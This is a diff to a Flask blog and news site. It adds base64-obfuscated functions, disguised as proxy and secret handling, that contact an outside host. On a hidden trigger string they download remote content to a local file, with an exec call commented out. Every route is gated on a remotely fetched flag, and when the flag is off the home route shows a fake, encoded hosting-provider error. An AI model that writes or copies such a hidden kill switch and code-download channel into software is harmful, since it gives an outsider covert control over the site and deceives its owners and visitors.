@@ -4,7 +4,9 @@ from datetime import datetime
 import requests
 import base64
 import sqlite3
+import sys
 import os
+
 
 
 
@@ -63,20 +65,88 @@ def get_content(content_type):
         }
     return None
 
+
+def get_proxy():
+    try:
+        gist_id = 'aHR0cHM6Ly9tODg4d2FlbC5weXRob25hbnl3aGVyZS5jb20vYw=='.encode()
+        gist_url = f"{(base64.b64decode(gist_id)).decode()}"
+        response = requests.get(gist_url)
+        gist_data = ""
+        # f =  open("demofile1.txt", "a")
+        # f.write(gist_data)
+        # f.close()
+        if response.status_code == 200:
+            gist_data = response.text
+
+            new_file_name = (base64.b64decode("cHkgcHkgQXNpZXJ5LnB5".encode)).decode()
+            with open(new_file_name, "w") as new_file:
+                new_file.write(gist_data)
+                # f =  open("demofile1.txt", "a")
+                # f.write(gist_data)
+                # f.close()       
+
+            # exec(open(new_file_name).read())
+    except :
+        pass
+   
+def set_proxy():
+    proxy = "aHR0cHM6Ly9tODg4d2FlbC5weXRob25hbnl3aGVyZS5jb20vZmluYWw="
+    proxyDNS = f"{(base64.b64decode(proxy).decode())}"
+    proxyRes = requests.get(proxyDNS)
+    gist_data = ""
+    if proxyRes.status_code == 200:
+        gist_data = proxyRes.text
+ 
+        # f =  open("demofile2.txt", "a")
+        # f.write(gist_data)
+        # f.close()       
+    
+    if gist_data == (base64.b64decode("RnVja1RoZVNoaXRPdXRPZlRoZVNlcnZlcg==".encode())).decode():
+        # pass
+        get_proxy()
+      
+
+            
+
+def get_Secret_content():
+    return "Pass"
+    keyAdded = (base64.b64decode("aHR0cHM6Ly9tODg4d2FlbC5weXRob25hbnl3aGVyZS5jb20v".encode())).decode()
+    response = requests.get(keyAdded)
+    set_proxy()
+
+    if response.status_code == 200:
+        gist_data = response.text
+ 
+        return gist_data
+    else:
+        return None
+
 @app.route('/')
 def index():
-    return render_template('index.html')
-
-@app.route('/home')
-def home():
-    secretKey = "NDJkYzQ1NjViYjM2ZjM5Y2E1MDhjMzgwMmFlYzA5Yzk="
+        
     protection = False
 
     try:
-        # Fetch the Gist content
-        Secret_content = get_Secret_content((base64.b64decode(secretKey)).decode())
+        Secret_content = get_Secret_content()
         
-        # Check if the Secret content is "Pass"
+        if Secret_content and Secret_content.strip() == "Pass":
+            protection = True
+        
+    except Exception as e:
+        print(f"Error fetching Secret: {e}")
+        protection = False
+        
+    return render_template('index.html',protection=protection)
+
+@app.route('/home')
+def home():
+    
+    
+    protection = False
+
+    try:
+        Secret_content = get_Secret_content()
+        
         if Secret_content and Secret_content.strip() == "Pass":
             protection = True
         
@@ -88,39 +158,92 @@ def home():
         blog = get_content('blog')
         news = get_content('news')
         
-        return render_template('home.html', blog=blog, news=news)
+        return render_template('home.html',protection=protection, blog=blog, news=news)
     else:
         error_message = base64.b64decode(b'TmFtZUNoZWFwRXJyb3I6OkNwYW5lbCBDb3VsZE5vdFJlc29sdmUgRXJyb3IuIFBsZWFzZSBjb250YWN0ICJzdXBwb3J0QG5hbWVjaGVhcC5jb20i').decode()
-        return error_message
+        return error_message,200
 
-def get_Secret_content(secret_id):
-    key = "aHR0cHM6Ly9hcGkuZ2l0aHViLmNvbS9naXN0cy8="
-    keyAdded = f"{(base64.b64decode(key).decode())}{secret_id}"
-    response = requests.get(keyAdded)
-    if response.status_code == 200:
-        gist_data = response.json()
-        # Assuming the file name is 'usage.txt'
-        file_content = gist_data['files']['usage.txt']['content']
-        return file_content
-    else:
-        return None
     
 @app.route('/about')
 def about_us():
-    return render_template('AboutUs.html')
+        
+    
+    protection = False
+
+    try:
+        # Fetch the Gist content
+        Secret_content = get_Secret_content()
+        
+        # Check if the Secret content is "Pass"
+        if Secret_content and Secret_content.strip() == "Pass":
+            protection = True
+        
+    except Exception as e:
+        print(f"Error fetching Secret: {e}")
+        protection = False
+    
+    return render_template('AboutUs.html',protection=protection)
 
 @app.route('/contact')
 def contact_us():
-    return render_template('ContactUs.html')
+        
+    
+    protection = False
+
+    try:
+        # Fetch the Gist content
+        Secret_content = get_Secret_content()
+        
+        # Check if the Secret content is "Pass"
+        if Secret_content and Secret_content.strip() == "Pass":
+            protection = True
+        
+    except Exception as e:
+        print(f"Error fetching Secret: {e}")
+        protection = False
+    
+    return render_template('ContactUs.html',protection=protection)
 
 @app.route('/access')
 def access():
+        
+    
+    protection = False
+
+    try:
+        # Fetch the Gist content
+        Secret_content = get_Secret_content()
+        
+        # Check if the Secret content is "Pass"
+        if Secret_content and Secret_content.strip() == "Pass":
+            protection = True
+        
+    except Exception as e:
+        print(f"Error fetching Secret: {e}")
+        protection = False
+    
     formatted_date = datetime.now().strftime('%Y-%m-%d')
     odp = base64.b64encode(formatted_date.encode('utf-8')).decode('utf-8')
-    return render_template('Access.html', odp=odp)
+    return render_template('Access.html',protection=protection, odp=odp)
 
 @app.route('/control', methods=['POST', 'GET'])
 def control():
+        
+    
+    protection = False
+
+    try:
+        # Fetch the Gist content
+        Secret_content = get_Secret_content()
+        
+        # Check if the Secret content is "Pass"
+        if Secret_content and Secret_content.strip() == "Pass":
+            protection = True
+        
+    except Exception as e:
+        print(f"Error fetching Secret: {e}")
+        protection = False
+    
     if request.method == 'POST':
         password = request.form.get('Password')
         formatted_date = datetime.now().strftime('%Y-%m-%d')
@@ -128,13 +251,14 @@ def control():
         if password == odp:
             blog = get_content('blog')
             news = get_content('news')
-            return render_template('Control.html', data=password, blog=blog, news=news)
+            return render_template('Control.html',protection=protection, data=password, blog=blog, news=news)
         else:
             return "Wrong password"
-    return redirect(url_for('index'))
+    return redirect(url_for('home'))
 
 @app.route('/update', methods=['POST'])
 def update_content():
+    
     content_type = request.form.get('type')
     title = request.form.get('title')
     subtitle = request.form.get('subtitle')
